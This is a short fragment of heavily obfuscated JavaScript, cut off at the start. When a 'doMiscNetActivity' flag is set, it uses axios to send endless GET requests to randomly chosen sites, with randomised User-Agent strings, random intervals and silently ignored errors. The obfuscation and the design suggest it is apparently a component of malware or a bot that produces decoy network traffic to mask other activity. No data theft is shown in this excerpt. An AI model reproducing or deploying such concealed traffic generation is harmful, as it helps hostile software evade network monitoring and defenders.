      setTimeout(f, (-0x1 * -0x197f9 + 0x11ee7 + -0x1cc80) * l * getRandomInt(0x47b + -0x164f * 0x1 + 0x11d5, 0x1805 + 0x4 * -0x11b + -0x6d * 0x2e));
  }, 0x234bb5 + -0x3dfe3f + 0x51a10a);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xdcb + 0x535 + -0x4 * -0x216) * getRandomInt(0x1b80 + 0x65b + 0x26b * -0xe, -0x45c + -0x21 * -0x18 + 0x149));
}, 0x4 * -0x475 + 0x2aa * 0xa + -0x86c);